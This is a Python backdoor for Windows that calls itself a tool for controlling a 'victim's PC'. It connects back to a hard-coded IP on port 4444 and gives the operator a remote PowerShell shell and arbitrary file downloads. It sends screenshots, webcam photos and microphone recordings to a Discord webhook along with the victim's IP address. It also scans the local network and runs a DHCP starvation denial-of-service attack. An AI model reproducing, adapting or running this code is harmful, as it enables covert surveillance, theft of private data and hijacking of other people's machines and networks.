import cv2
import os
import sys
import socket
import subprocess
import time
import psutil
import ctypes
import pynput
import shutil
import typing
import requests
import webbrowser
import pyautogui
from scapy.all import *
from requests import get    
from termcolor import colored
from discord_webhook import DiscordWebhook, DiscordEmbed
from cv2 import VideoCapture
import sounddevice as sd
import wavio as wv
from cv2 import imshow, imwrite, destroyWindow, waitKey

e = False
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

ip = "192.168.1.6"
port = 4444
ipadd = get('https://api.ipify.org').text

class back:
    def dos(self, packets:int, dst='ff:ff:ff:ff:ff:ff'):
        conf.checkIPaddr = False
        count = 1
        
        for i in range(0, int(packets)):
            dhcp_discover = Ether(dst=dst,src=RandMAC())  \
                                /IP(src='0.0.0.0',dst='255.255.255.255') \
                                /UDP(sport=68,dport=67) \
                                /BOOTP(op=1,chaddr = RandMAC()) \
                                /DHCP(options=[('message-type','discover'),('end')])
            sendp(dhcp_discover,iface='Ethernet',verbose=False)
            print(count)
            count += 1

    def getaway_mac(self):
        arp = ARP(pdst="192.168.1.1/24")
        eth = Ether(dst="ff:ff:ff:ff:ff:ff")
        a = eth/arp
        answer = srp(a, timeout=1, verbose=False)[0]
        count = 1

        for element in answer:
            js = colored(f"\n{count} ==>:  {element[1].psrc}: {element[1].hwsrc}\n", "green")
            s.send(js.encode())
            count += 1

    def help_desk(self):
        self.help_ = ("==================================================================================\n"+
                    "||  1.) bye                         -- To close the session.                     ||\n"+
                    "||  2.) screen -webhook             -- To take screenshot.                       ||\n"+
                    "||  3.) webcam -webhook             -- To take webcam photo.                     ||\n"+
                    "||  4.) record -t -c -freq -webhook -- To record sound from Mic.                 ||\n"+
                    "||  5.) list                        -- To list the process id.                   ||\n"+
                    "||  6.) install -url                -- To install any program.                   ||\n"+
                    "||  7.) open -link                  -- To open any url on victim's PC.           ||\n"+
                    "||  8.) wallpaper -path             -- Changes the wallpaper of the victim's PC. ||\n"+
                    "||  9.) get mac                     -- Sends the mac addresses of victim's LAN.  ||\n"+
                    "|| 10.) dos -number -mac(optional)  -- DHCP starvation on the LAN or single MAC. ||\n"+
                    "==================================================================================\n")          
        s.send(self.help_.encode())

    def screenshot(self, url):
        webhook = DiscordWebhook(url=url)
        img = pyautogui.screenshot("1.png")
        with open("1.png", "rb") as f:
            webhook.add_file(file=f.read(), filename='1.png')
        embed = DiscordEmbed(title='Victim Screenshot',description=f'IP Of The Victim: {ipadd}',color='03fc30')
        webhook.add_embed(embed)
        response = webhook.execute()
        os.remove("1.png")

    def webcam(self, url):
        webhook = DiscordWebhook(url=url)
        cam = VideoCapture(0, cv2.CAP_DSHOW)
        result, image = cam.read()
        if result:   
            imwrite("2.png", image)
            waitKey(0)
            with open("2.png", "rb") as f:
                webhook.add_file(file=f.read(), filename='2.png')
            embed = DiscordEmbed(title="Victim's Webcam Photo",description=f'IP Of The Victim: {ipadd}',color='1d0a26')
            webhook.add_embed(embed)
            response = webhook.execute()
            os.remove("2.png")
        else:
            s.send(b"No Image Detected. Please Try Again!")

    def process_id(self):
        num = 1
        for proc in psutil.process_iter():
            try:
                processName = proc.name()
                processID = proc.pid
                for_send = f"{num}. {processName} ::: {processID}\n"
                num +=1
                s.send(for_send.encode())
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass

    def record_sound(self, time, channel, frequency, url):
        try:
            webhook = DiscordWebhook(url=url)
            freq = int(frequency)
            duration = int(time)
            main = freq * duration
            recording = sd.rec(int(freq * duration), samplerate=freq, channels=int(channel))

            sd.wait()
            wv.write("recording1.wav", recording, freq, sampwidth=2)
            with open("recording1.wav", "rb") as f:
                webhook.add_file(file=f.read(), filename='recording1.wav')
            embed = DiscordEmbed(title='Victim Mic Recording',description=f'IP Address Of The Victim: {ipadd}',color='1d0a26')
            webhook.add_embed(embed)
            response = webhook.execute()
            os.remove("recording1.wav")
        except:
            s.send(b"[!] Unable To Record Sound!")
    
    def open_url(self, link):
        webbrowser.open_new(link)
    def download(self, url):
        get = requests.get(url)
        file_name = url.split("/")[-1]
        with open(file_name, "wb") as file:
            file.write(get.content)
                
    def shell(self):
        while True:
            s.send(b"\n[*] >>")
            cmd = s.recv(1024).decode()
            if cmd[:3] == "cd ":
                cmd = cmd[:-1]
                try:
                    os.chdir(cmd[3:])
                except:
                    continue
            
            elif (cmd[:3] == "bye"):
                s.send(b"Bye...\n")
                s.close()
                break
            
            elif (cmd[:6] == "screen"):
                time.sleep(0.5)
                fi = cmd[7:-1] 
                self.screenshot(fi)

            elif (cmd[:4] == "open"):
                fi = cmd[5:-1]
                self.open_url(fi)  
            
            elif (cmd[:3] == "dos"):
                px = cmd[4:-1]
                a = px.split(" ")
                if len(a) == 1:
                    d = Thread(target=self.dos, args=(a[0],),).start()
                else:
                    dd = Thread(target=self.dos, args=(a[0], a[1]),).start()
            
            elif (cmd[:7] == "get mac"):
                self.getaway_mac()
            
            elif (cmd[:6] == "webcam"):
                time.sleep(0.5)
                xi = cmd[7:-1]
                self.webcam(xi)
            
            elif (cmd[:4] == "list"):
                self.process_id()

            elif (cmd[:9] == "wallpaper"):
                time.sleep(0.1)
                x = cmd[10:-1]
                ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{x}" , 0)

            elif (cmd[:6] == "record"):
                s.send(b"\n[+] 44100 Frequency Is Recommended!!\n[+] Channel 2 Is Recommended!!\n")
                ai = cmd[7:-1]
                c = ai.split(" ")
                self.record_sound(c[0], c[1], c[2], c[3])
                
            elif (cmd[:4] == "help"):
                self.help_desk()

            elif (cmd[:7] == "install"):
                try:
                    to_download = cmd[:-1]
                    print(to_download[8:])
                    self.download(to_download[8:])
                except:
                    s.send(b"\n[!] Can't Fetch The File!!\n")
            else:
                main = "powershell " + cmd
                try:
                    result = subprocess.getoutput(main)
                except:
                    continue
                s.send(result.encode())

    def main(self):
        while True:
            try:
                s.connect((ip, port))
                if ctypes.windll.shell32.IsUserAnAdmin():
                    s.send(colored(b"\n[+]>> User Is Running Script As 'Administrator'\n", "blue"))
                else:
                    n = colored("\n[-]>> User Is Running Script As 'Non Administrator'\n", "red")
                    s.send(n.encode())
                break
            except socket.error:
                time.sleep(3)
        banner = (
                    "\n==============================================\n"+
                    f"|| IP:      --  {ipadd}               ||\n"+
                     "|| help     -- Shows Extra Commands         || \n"+
                     "==============================================\n")
        s.send(banner.encode())
        self.getaway_mac()
        self.shell()

backdoor = back()
backdoor.main()
